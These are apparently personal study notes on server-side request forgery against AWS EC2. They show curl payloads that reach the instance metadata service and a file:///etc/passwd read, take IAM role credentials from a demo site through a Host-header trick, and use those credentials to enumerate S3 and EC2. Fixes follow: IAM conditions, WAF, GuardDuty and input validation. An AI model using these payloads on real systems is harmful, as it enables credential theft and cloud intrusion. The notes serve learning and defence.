# Notes

## AWS metadata

You can access aws metadata inside your ec2 (hypervisor)

```
ec2-user> curl -s http://169.254.169.254/latest/meta-data

# E.g.
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/SSRFDEMO-ISRM-WAF-Role
```

## Server Side Request Forgery (SSRF)

Ref: https://www.youtube.com/channel/UCc5ZvM72SAxmjyQypnJVBpQ/live

SSRF is a vulnerability which allows an attacker to make web requests from the context of the server
 host machine to arbitrary URL's.

This vulnerability can allow the attacker to access resources internal to the network, which would otherwise
be inaccessible.

E.g. Run a curl command from a server.

```
curl -vv "http://server/redirect?url=http://169.254.169.254/latest/meta-data/"

curl -vv "https://example.com/viewimage/?url=file:///etc/passwd"

PHP:
curl_exec($ch);

Proxy:
curl "https://proxy.duckduckgo.com/iur/?f=1&image_host=http://169.254.169.254/latest/meta-data"

Proxy Config (nginx):
# Don't ever use setup a proxy like this!
server {
  listen 80 default_server;
  location / {
    proxy_pass http://$host;
  }
}

```

Example

```
> curl -s http://ssrfdemo.getserverless.com.au/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254';echo

SSRFDEMO-ISRM-WAF-ROLE

> curl -s http://ssrfdemo.getserverless.com.au/latest/meta-data/iam/security-credentials/SSRFDEMO-ISRM-WAF-ROLE -H 'Host:169.254.169.254';echo

{
  "Code": ...,
  "AccessKeyId": ...,
  "Token": ...,
}

# Copy these to your credential file
aws_access_key_id =
aws_secret_access_key =
aws_session_token = 

# Now you can access the underlying resources that the EC2 can access, e.g.
aws s3 ls

# Get instance ids
aws ec2 describe-instances --query 'Reservations[*].Instances[*]'

# Get user data
aws ec2 describe-instance-attribute --instance-id <instance id> --attribute userData --region <region>

echo <user data> | base64 --decode

```

### Fix

1. Add a policy to the role to ensure all action must be from the vpc.

```
"Statement": [
  {
    "Action": "*",
    "Resource": "*",
    "Effect": "Deny",
    "Condition": {
      "StringNotEquals": {
        "aws:SourceVpc": [ "vpc-xxx-this-vpc" ]
      }
    }
  }
]
``` 

Cannot access s3 anymore.

But still can do - 
curl -s http://ssrfdemo.getserverless.com.au/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254';echo

2. Set up WAF 

```
a) go to WAF > Web ACLs
b) create/edit Web ACL (e.g. SSRF_Protection)
   - Rules > Edit web ACL
     - Rule: SSRFProectionRule
     - Action: Block
c) Details

Now curl won't work anymore 
curl -s http://ssrfdemo.getserverless.com.au/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254';echo

3. GuardDuty

Reported "UnauthorizedAccess:IAMUser ... has been used from external IP address..."

4. Cloudtrail

($.errorCode="Client.UnauthorizedOperation")

4. Patch your applications and OS
5. Never trust user inputL use input validation checks
6. Blacklist the AWS metadata url
7. Create different AWS accounts to limit the blast radius
8. Use IP reputation blacklisting and other WAF rules

```
